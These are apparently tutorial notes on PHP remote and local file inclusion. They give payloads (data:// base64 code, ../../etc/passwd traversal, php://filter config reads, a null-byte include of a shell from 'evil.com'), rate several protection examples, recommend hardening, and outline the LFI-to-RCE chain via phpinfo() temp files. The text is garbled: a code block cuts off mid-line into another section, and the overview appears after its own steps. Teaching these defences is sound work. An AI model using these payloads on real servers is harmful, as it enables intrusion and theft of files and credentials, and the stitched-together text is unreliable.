malicious PHP file (`phpinfo.php`) on FTP server at `192.168.1.6`\n- When vulnerable app includes this, it fetches and executes the remote code\n- Server must have `allow_url_include` enabled\n\n---\n\n### **2. Data URI Payload (Base64 Encoded)**\n```\nPayload: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\n\nUsage: ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\n````\n\n**🔍 Decoded content:** `<?php phpinfo(); ?>`\n\n**📝 How it works:**\n\n- `data://` wrapper allows embedding base64-encoded PHP code directly in URL\n- PHP decodes and executes this as inline PHP code if `allow_url_include` is enabled\n- Bypasses file-based detection\n\n**Base64 encoding example:**\n\nphp\n\n````php\n<?php phpinfo(); ?>\n```\nEncodes to: `PD9waHAgcGhwaW5mbygpOyA/Pg==`\n\n---\n\n### **3. Additional Bypass Techniques**\n\n**Path Traversal:**\n```\n?file=../../../../etc/passwd\n?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n```\n\n**Null Byte Injection (Old PHP versions):**\n```\n?file=http://evil.com/shell%00\n```\n\n**Protocol Variations:**\n```\n?file=file:///etc/passwd\n?file=php://input\n?file=php://filter/convert.base64-encode/resource=config\n````\n\n---\n\n## 🛡️ **Security Analysis**\n\n### **🔴 Example 4 - Completely Vulnerable**\n\n- No validation whatsoever\n- Allows any protocol, any file, any path\n- Direct RFI and LFI possible\n\n### **🟠 Example 5 - Weak Protection**\n\n**Strengths:**\n\n- ✅ Blocks basic `http://` and `https://` URLs\n\n**Weaknesses:**\n\n- ❌ Bypassable with `ftp://`, `data://`, `file://`\n- ❌ Case manipulation: `HTtp://`\n- ❌ Local file inclusion still possible\n- ❌ No path sanitization\n\n### **🟡 Example 7 - Moderate Protection**\n\n**Strengths:**\n\n- ✅ Restricts to specific domain\n- ✅ Better than no validation\n\n**Weaknesses:**\n\n- ❌ Subdomain attacks possible\n- ❌ DNS hijacking risk\n- ❌ Pattern matching can be bypassed\n- ❌ No realpath validation\n\n### **🟢 Example 8 - Good But Narrow**\n\n**Strengths:**\n\n- ✅ Very specific filename requirement\n- ✅ Harder to exploit\n\n**Weaknesses:**\n\n- ❌ Limited functionality\n- ❌ Pattern still matchable in malicious paths\n\n### **🟢 Example 9 - Best Practice** ⭐\n\n**Strengths:**\n\n- ✅ Whitelist approach\n- ✅ No path traversal\n- ✅ No remote inclusion\n- ✅ Simple and secure\n- ✅ Only approved files\n\n**Minimal weaknesses:**\n\n- Still need to ensure whitelisted files are safe\n\n---\n\n## 🔐 **Complete Security Recommendations**\n\n### **1. Whitelist Approach (RECOMMENDED)** ⭐\n\nphp\n\n```php\n<?php\n$allowed_files = [\n    'home' => '/var/www/pages/home.php',\n    'about' => '/var/www/pages/about.php',\n    'contact' => '/var/www/pages/contact.php'\n];\n\n$page = $_GET['page'] ?? 'home';\n\nif (array_key_exists($page, $allowed_files)) {\n    include $allowed_files[$page];\n} else {\n    include $allowed_files['home'];\n}\n?>\n```\n\n---\n\n### **2. Disable Dangerous PHP Settings**\n\nini\n\n```ini\n; In php.ini\nallow_url_include = Off\nallow_url_fopen = Off\nopen_basedir = /var/www/html\n```\n\n---\n\n### **3. Sanitize and Validate Input**\n\nphp\n\n```php\n<?php\n$file = $_GET['file'] ?? '';\n\n// Remove any path components\n$file = basename($file);\n\n// Allow only alphanumeric, dash, underscore\n$file = preg_replace('/[^a-zA-Z0-9_-]/', '', $file);\n\n// Build safe path\n$safe_path = ent variables including:\n\n- `$_GET` - Query parameters\n- `$_POST` - Form data\n- `$_FILES` - **Temporary upload paths** (e.g., `/tmp/phpXYZ123`)\n\nThe `$_FILES` output reveals temporary filenames that can be targeted for inclusion.\n\n### **Step 2: Multiple Uploads to phpinfo()**\n\nBy performing multiple upload POST requests to a script that calls `phpinfo()`, an attacker can observe the temporary filenames generated for each upload on the `phpinfo()` page.\n\n### **Step 3: Mapping Temp File from Upload to LFI**\n\nOnce an attacker learns the exact temporary filename (e.g., `/tmp/phpXYZ123`), they can attempt to include that file via a vulnerable LFI endpoint.\n\n### **Step 4: Executing Uploaded PHP Code**\n\nIf the uploaded file contains PHP code (for example, a web shell) and the LFI includes that temporary file, the included PHP code will execute—resulting in **Remote Code Execution**.\n\n---\n\n## ⚙️ Key Conditions\n\nFor this attack to succeed, the following conditions must be met:\n\n|Condition|Description|\n|---|---|\n|🔧 **File Uploads Enabled**|The server must allow file uploads (`file_uploads = on`)|\n|📄 **phpinfo() Page Access**|There must be access to a `phpinfo()` page that discloses file upload temporary paths|\n|🚪 **LFI Vulnerability**|The application must have an LFI vulnerability that allows including arbitrary files|\n|🎯 **Control Over Upload Content**|The attacker must be able to control uploaded content and observe temporary file paths via `phpinfo()`|\n\n---\n\n## 🛠️ Exploitation Script Analysis\n\n# 🔓 LFI to RCE via phpinfo()\n\n> **Advanced Web Application Penetration Testing Technique**\n\n---\n\n## 📋 Overview\n\nThis document describes a sophisticated exploitation technique that chains **Local File Inclusion (LFI)** vulnerabilities with **Remote Code Execution (RCE)** through PHP's `phpinfo()` function disclosure.\n\n### 🎯 Attack Vector\n\nThe technique exploits how PHP's `phpinfo()` reveals environment and request information—including
